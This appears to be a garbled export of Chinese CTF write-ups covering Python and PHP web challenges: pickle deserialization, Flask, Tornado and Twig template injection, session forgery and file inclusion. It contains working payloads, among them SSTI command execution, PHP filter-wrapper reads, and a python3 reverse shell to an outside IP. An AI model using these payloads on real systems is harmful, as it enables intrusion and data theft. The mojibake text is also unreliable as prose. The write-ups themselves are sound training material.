é¢˜ç›®æç¤ºäº†pickleï¼Œç›´æ¥å…¨å±€æœç´¢ï¼ŒAdmin.pyæœ‰pickleååºåˆ—åŒ–æ¼æ´ åˆ©ç”¨è„šæœ¬ç”Ÿæˆpayloadï¼š 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a å°†ç”Ÿæˆçš„payloadæ”¾åˆ°éšè—çš„è¾“å…¥æ¡†é‡Œï¼Œåªéœ€å°†hidden=&quot;hidden&quot;åˆ é™¤å³å¯ã€‚ SUCTF 2019 Pythonginx WesternCTF2018 shring è€ƒç‚¹ è§£é¢˜ æºç  1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;: app.run(debug=True) TODO æŠ¤ç½‘æ¯2018 easy_tornado è€ƒç‚¹ tornado æ¨¡æ¿æ³¨å…¥ è§£é¢˜ è¿™é“é¢˜å¾ˆé‡è¦çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯è§‚å¯Ÿurl 1http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc å¹¶ä¸”filehash=md5(cookie_secret+md5(filename))ï¼Œæ‰€ä»¥è¦æ‰¾åˆ°cookie_secretçš„å€¼ã€‚ å½“ä¸è¾“å…¥filehashå‚æ•°çš„æ—¶å€™ï¼Œurlæ˜¯è¿™æ ·çš„ï¼š 1http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error å¹¶ä¸”é¡µé¢å›æ˜¾Errorï¼Œè¿™ä¸ªå°±éœ€è¦æ¯”è¾ƒæ•æ„Ÿçš„æ³¨æ„åˆ°è¿™é‡Œæ˜¯æ¨¡æ¿æ³¨å…¥çš„ç‚¹ã€‚ å‚è€ƒæ–‡ç« ç”¨çš„å°±æ˜¯handler.settingså¯¹è±¡ handler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ã€‚ æ‰€ä»¥ä¼ é€’error?msg=&#123;&#123; handler.settings &#125;&#125;å¾—åˆ°cookie_secretã€‚ HCTF 2018 Hideandseek TODO [CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board TODO HCTF2018 Admin å‡ºé¢˜äººwriteupï¼šhttps://www.ckj123.com/?p=147 è€ƒç‚¹ Flask Sessionä¼ªé€  Unicodeæ¬ºéª— æ¡ä»¶ç«äº‰ è§£é¢˜ æ–¹æ³•ä¸€ Unicodeç¼–ç æ¬ºéª— ç»“åˆæ”¹å¯†ç çš„åŠŸèƒ½ï¼Œçœ‹ä¸€ä¸‹changeå‡½æ•° 123456789101112def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form) å…¶ä¸­ç¬¬6è¡Œçš„strloweræ˜¯è‡ªå·±å°è£…çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨Pythonçš„åº“å‡½æ•°ï¼š 123def strlower(username): username = nodeprep.prepare(username) return username å…¶ä¸­ nodeprep æ¥è‡ª twisted.words.protocols.jabber.xmpp_stringprepã€‚ å¹¶ä¸”åœ¨æ³¨å†Œå’Œç™»å½•çš„ä»£ç ä¸­éƒ½ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ADMINç»•è¿‡ã€‚ è¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« è®²åˆ°äº†nodeprepå…³äºUnicodeç¼–ç çš„é—®é¢˜ï¼š https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e ä½¿ç”¨ä¸¤æ¬¡nodeprep.prepareå‡½æ•°ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š 1á´¬ -&gt; A -&gt; a Unicode â€”&gt; ä¸­æ–‡ï¼šhttps://tool.chinaz.com/tools/unicode.aspx å³ç¬¬ä¸€æ¬¡å°†å…¶è½¬æ¢ä¸ºå¤§å†™ï¼Œç¬¬äºŒæ¬¡å°†å…¶è½¬æ¢ä¸ºå°å†™ã€‚ æ€è·¯ï¼š æ³¨å†Œç”¨æˆ·á´¬dmin ç™»å½•ç”¨æˆ·á´¬dminï¼Œå˜æˆAdmin ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç  æ–¹æ³•äºŒ Flask session ä¼ªé€  åŸç†ï¼šhttps://www.leavesongs.com/PENETRATION/client-session-security.html å·¥å…·ï¼šhttps://github.com/noraj/flask-session-cookie-manager ä¿®æ”¹nameä¸ºadminï¼š 1&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125; å†å¯¹å…¶è¿›è¡Œencodeæ“ä½œï¼š æ›´æ”¹cookieçš„å€¼ï¼š æäº¤æ›´æ”¹ï¼Œåˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸè·å–flag~ æ–¹æ³•ä¸‰ æ¡ä»¶ç«äº‰ https://tmr.js.org/p/3a03e44b/ ä¸ç”±çš„æ„Ÿå¹è¿™äº›äººçš„è„‘å­æ€ä¹ˆè¿™ä¹ˆå¥½ä½¿ã€‚ã€‚ã€‚ğŸ˜‚ BJDCTF 2nd fake google è€ƒç‚¹ Flask SSTI æ–‡ä»¶è¯»å– è§£é¢˜ è¿™é“é¢˜å°±æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„Flask æ¨¡æ¿æ³¨å…¥æ¼æ´äº†ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç»•è¿‡ï¼Œç›´æ¥ä¸Špayloadï¼š 1?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; BJDCTF2020 Cookie is stable è€ƒç‚¹ Python Twigæ¨¡æ¿æ³¨å…¥ è§£é¢˜ å’Œä¸Šé¢˜ä¸€æ ·æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œä¸è¿‡æ³¨å…¥ç‚¹åœ¨Cookieé‡Œ æ¸²æŸ“å¼•æ“ä¹Ÿæ¢æˆäº†åŸºäºPythonçš„Twig ä»ç½‘ä¸Šæ‰¾åˆ°çš„ Twig poc 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125; V&amp;Nå…¬å¼€èµ› CheckIn è€ƒç‚¹ åå¼¹shell æ–‡ä»¶æè¿°ç¬¦ è§£é¢˜ 123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#x27;/flag&#x27;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#x27;/shell&#x27;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#x27;c&#x27;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#x27;/&#x27;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;) shellè·¯ç”±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰flag.txtå·²ç»è¢«åˆ é™¤äº†ï¼Œå¹¶ä¸”ä¸èƒ½å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚ é¦–å…ˆè‚¯å®šæ˜¯æƒ³åˆ°åå¼¹ä¸€ä¸ªshellï¼Œç”¨BUUå°å·å¼€ä¸€ä¸ªLinuxä¸»æœºï¼Œå°è¯•æœ‰bashã€curlã€ncã€python -cç­‰ï¼Œä½†æ˜¯è¿™é‡Œæµ‹è¯•åå‘ç°è¿™äº›å¸¸ç”¨çš„å‘½ä»¤éƒ½è¢«ç¦äº†ï¼Œæ— æ³•åå¼¹Shellã€‚æœ€åå†æ¢æˆpython3å°±å¯ä»¥æˆåŠŸåå¼¹shellï¼š 1http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27 æ¥ä¸‹æ¥çš„ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ¥æ¢å¤æ–‡ä»¶ã€‚ ä»€ä¹ˆæ˜¯æ–‡ä»¶æè¿°ç¬¦ ä¾‹å¦‚Pythonä¸­ï¼Œå½“æˆ‘ä»¬open()å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ä¾¿åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œåå¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½¿ç”¨read()å‡½æ•°ä¾¿æ˜¯è¯»å–æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹ï¼Œclose()å‡½æ•°ç”¨äºå…³é—­/é”€æ¯è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ æ–‡ä»¶æè¿°ç¬¦å‚¨å­˜åœ¨ä»€ä¹ˆåœ°æ–¹ï¼š /proc/&lt;pid&gt;/fd/&lt;id&gt; æŸ¥çœ‹/procç›®å½•ä¸‹çš„è¿›ç¨‹å· æŸ¥çœ‹è¿›ç¨‹å·ç­‰äº10ä¸‹é¢çš„fdç›®å½• æ–‡ä»¶æè¿°ç¬¦ç­‰äº3å³ä¸ºflagæ–‡ä»¶ CISCN2019 åä¸œå—èµ›åŒº Double Secret è€ƒç‚¹ æ¨¡æ¿æ³¨å…¥ RC4åŠ å¯† è§£é¢˜ æ‰«ç›®å½•å¾—åˆ°secretï¼Œè®¿é—®æç¤ºè¦æœ‰secretå‚æ•°ï¼ŒFuzzä¸€ä¸‹å‘ç°æŠ¥é”™ 123456789File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret if(secret&#x3D;&#x3D;None): return &#39;Tell me your secret.I will encrypt it so others can\\&#39;t see&#39; rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;) #è§£å¯† deS&#x3D;rc.do_crypt(secret) a&#x3D;render_template_string(safe(deS)) if &#39;ciscn&#39; in a.lower(): return &#39;flag detected!&#39; return a å¦‚æœä½ ä¼ å…¥äº†å‚æ•°ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯RC4åŠ å¯†ï¼Œè€Œä¸”è¿˜æ³„éœ²äº†å¯†é’¥ï¼Œå¯†é’¥å°±æ˜¯â€œHereIsTreasureâ€ï¼Œè€Œä¸”é€šè¿‡æŠ¥é”™ï¼Œæˆ‘ä»¬äº†è§£åˆ°è¿™æ˜¯flaskçš„æ¨¡æ¿ï¼Œè€Œä¸”pythonçš„ç‰ˆæœ¬æ˜¯2.7çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨flaskçš„æ¨¡æ¿æ³¨å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œåªä¸è¿‡éœ€è¦è¿›è¡ŒRC4åŠ å¯†ã€‚ RC4åŠ å¯†è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %quote(cipher)) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;) å¾—åˆ°åŠ å¯†åçš„payloadåä¼ å…¥ï¼Œæ‹¿åˆ°flagã€‚ GXYCTF2019 Strongest Mind è€ƒç‚¹ Pythonè„šæœ¬ è§£é¢˜ æ³¨æ„Sessionçš„ä½¿ç”¨ 123456789101112131415161718from requests import *import reimport timeimport requestsurl = &quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;s = requests.session()a = s.get(url)pattern = re.findall(r&#x27;\\d+.[+-].\\d+&#x27;, a.text)c = eval(pattern[0])a = s.post(url, data=&#123;&quot;answer&quot;: c&#125;)for i in range(1000): time.sleep(0.1) pattern = re.findall(r&#x27;\\d+.[+-].\\d+&#x27;, a.text) c = eval(pattern[0]) print(c) a = s.post(url, data=&#123;&quot;answer&quot;: c&#125;)print(a.content) DDCTF2019 homebrew event loop è€ƒç‚¹ é€»è¾‘æ¼æ´ flask session è§£é¢˜ è¯¦ç»†wpï¼šhttps://blog.cindemor.com/post/ctf-web-16.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = &#x27;*********************&#x27; # censoredurl_prefix = &#x27;/d5afe1f66147e857&#x27;def FLAG(): return &#x27;*********************&#x27; # censoreddef trigger_event(event): # event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;] session[&#x27;log&#x27;].append(event) if len(session[&#x27;log&#x27;]) &gt; 5: session[&#x27;log&#x27;] = session[&#x27;log&#x27;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None): # haystack = action:trigger_event%23;action:buy;5%23action:get_flag; # prefix = trigger_event%23; haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystackclass RollBackException: passdef execute_event_loop(): valid_event_chars = set( &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;) resp = None while len(request.event_queue) &gt; 0: # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; event = request.event_queue[0] request.event_queue = request.event_queue[1:] if not event.startswith((&#x27;action:&#x27;, &#x27;func:&#x27;)): continue for c in event: if c not in valid_event_chars: break else: # event = action:trigger_event%23;action:buy;5%23action:get_flag; is_action = event[0] == &#x27;a&#x27; # action = trigger_event%23 action = get_mid_str(event, &#x27;:&#x27;, &#x27;;&#x27;) # args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;] args = get_mid_str(event, action+&#x27;;&#x27;).split(&#x27;#&#x27;) try: event_handler = eval( # event_handler = trigger_event#_handler action + (&#x27;_handler&#x27; if is_action else &#x27;_function&#x27;)) # ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]) ret_val = event_handler(args) except RollBackException: if resp is None: resp = &#x27;&#x27; resp += &#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27; resp += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27; session[&#x27;num_items&#x27;] = request.prev_session[&#x27;num_items&#x27;] session[&#x27;points&#x27;] = request.prev_session[&#x27;points&#x27;] break except Exception, e: if resp is None: resp = &#x27;&#x27; # resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == &#x27;&#x27;: resp = (&#x27;404 NOT FOUND&#x27;, 404) session.modified = True return resp@app.route(url_prefix+&#x27;/&#x27;)def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == &#x27;&#x27; or (not querystring.startswith(&#x27;action:&#x27;)) or len(querystring) &gt; 100: querystring = &#x27;action:index;False#False&#x27; if &#x27;num_items&#x27; not in session: session[&#x27;num_items&#x27;] = 0 session[&#x27;points&#x27;] = 3 session[&#x27;log&#x27;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args): page = args[0] html = &#x27;&#x27; html += &#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;.format( session[&#x27;num_items&#x27;], session[&#x27;points&#x27;]) if page == &#x27;index&#x27;: html += &#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27; elif page == &#x27;shop&#x27;: html += &#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27; elif page == &#x27;reset&#x27;: del session[&#x27;num_items&#x27;] html += &#x27;Session reset.&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27; return htmldef index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == &#x27;True&#x27;: source = open(&#x27;eventLoop.py&#x27;, &#x27;r&#x27;) html = &#x27;&#x27; if bool_download_source != &#x27;True&#x27;: html += &#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27; for line in source: if bool_download_source != &#x27;True&#x27;: html += line.replace(&#x27;&amp;&#x27;, &#x27;&amp;amp;&#x27;).replace(&#x27;\\t&#x27;, &#x27;&amp;nbsp;&#x27;*4).replace( &#x27; &#x27;, &#x27;&amp;nbsp;&#x27;).replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&lt;br /&gt;&#x27;) else: html += line source.close() if bool_download_source == &#x27;True&#x27;: headers = &#123;&#125; headers[&#x27;Content-Type&#x27;] = &#x27;text/plain&#x27; headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=serve.py&#x27; return Response(html, headers=headers) else: return html else: trigger_event(&#x27;action:view;index&#x27;)def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return &#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;.format(args[0]) session[&#x27;num_items&#x27;] += num_items trigger_event([&#x27;func:consume_point;&#123;&#125;&#x27;.format( num_items), &#x27;action:view;index&#x27;])def consume_point_function(args): point_to_consume = int(args[0]) if session[&#x27;points&#x27;] &lt; point_to_consume: raise RollBackException() session[&#x27;points&#x27;] -= point_to_consumedef show_flag_function(args): flag = args[0] # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return &#x27;You naughty boy! ;) &lt;br /&gt;&#x27;def get_flag_handler(args): if session[&#x27;num_items&#x27;] &gt;= 5: # show_flag_function has been disabled, no worries trigger_event(&#x27;func:show_flag;&#x27; + FLAG()) trigger_event(&#x27;action:view;index&#x27;)if __name__ == &#x27;__main__&#x27;: app.run(debug=False, host=&#x27;0.0.0.0&#x27;) payload: 1action:trigger_event%23;action:buy;5%23action:get_flag; è¿›å…¥é˜Ÿåˆ—çš„é¡ºåºï¼š 1234567action:trigger_event#;action:buy;5#action:get_flag;action:buy;5action:get_flag;func:consume_point;5action:view;indexfunc:show_flag;&#96;FLAG()&#96;action:view;index æ—¥å¿—å†™å…¥çš„é¡ºåºï¼š 12345action:trigger_event#;action:buy;5#action:get_flag;[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;][&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]func:show_flag;&#96;FLAG()&#96;action:view;index æ‹¿åˆ°flask sessionåè§£å¯†","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"Python","slug":"CTF/Python","permalink":"http://ca0y1h.top/categories/CTF/Python/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«","date":"2020-08-18T09:59:20.000Z","path":"Web_security/ctf_writeup/12.buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«/","text":"BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å« BSidesCTF2020 Had a bad day è€ƒç‚¹ LFI PHPä¼ªåè®® è§£é¢˜ index.phpæœ‰ä¸€ä¸ªå‚æ•°æ˜¯woofersï¼Œæµ‹è¯•SQLæ³¨å…¥çš„æ˜¯å‘ç°äº†includeå‡½æ•°çš„æŠ¥é”™ï¼Œç”¨PHPä¼ªåè®®è¯»å–æ–‡ä»¶ å®¡è®¡index.php 1234567891011&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file))&#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125;?&gt; ä¼ å…¥çš„categoryéœ€è¦æœ‰woofers,meowers,indexæ‰èƒ½åŒ…å«ä¼ å…¥ä»¥ä¼ å…¥åä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•åŒ…å«flag.phpï¼Œç›´æ¥è¯•ä¸€ä¸‹åœ¨woofersåé¢åŠ /../flag ä¸Šé¢è¿™ä¸ªåº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œæˆ‘éšä¾¿è¯•ä¸€ä¸‹ç«Ÿç„¶ç›´æ¥å‡ºæ¥äº†ï¼Œè¿™ä¸ªæ€è·¯å¯ä»¥è®°ç€ã€‚ é¢„æœŸè§£çš„payloadçš„æ€è·¯æ˜¯åˆ©ç”¨php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®è¯»å–flag.php 1index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag æå®¢å¤§æŒ‘æˆ˜ 2019 Secret File è€ƒç‚¹ ä¿¡æ¯æ³„éœ² æ–‡ä»¶åŒ…å« è§£é¢˜ æŸ¥çœ‹æºç  è®¿é—®Archive_room.php BurpæŠ“åŒ… è®¿é—®secr3t.php 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;&#x2F;title&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;&#x2F;html&gt; include($file)æ–‡ä»¶åŒ…å«ï¼Œè€Œä¸”ä¸èƒ½ç”¨inputã€dataç­‰ä¼ªåè®®æ¥è¯»å–æ–‡ä»¶ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æ–¹å¼ payloadï¼š 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php ACTF2020 æ–°ç”Ÿèµ› Include TODO BJDCTF2020 ZJCTF ä¸è¿‡å¦‚æ­¤ è€ƒç‚¹ PHPä¼ªåè®®è¯»å–æ–‡ä»¶ preg_matchå‘½ä»¤æ‰§è¡Œ è§£é¢˜ 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; å¾ˆæ˜æ˜¾è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«è¯»å–next.phpï¼Œpayloadï¼š 1http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php POSTï¼šI have a dream è§£ç å¾—åˆ°next.php 123456789101112131415&lt;?php $id = $_GET[&#x27;id&#x27;]; $_SESSION[&#x27;id&#x27;] = $id; function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str ); &#125; foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;; &#125; function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]); &#125; è¿™é‡Œæ¶‰åŠåˆ°preg_replace()å‡½æ•°çš„å‘½ä»¤æ‰§è¡Œï¼Œé™„ä¸Šåˆ†ææ–‡ç« ï¼šhttps://xz.aliyun.com/t/2557 payloadï¼š 1http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;next.php?\\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27); æ‰§è¡Œsystemå‡½æ•°åé¢è¦åŠ åˆ†å·ã€‚ å®‰æ´µæ¯2019 easyweb è€ƒç‚¹ æ–‡ä»¶åŒ…å« è§£é¢˜ 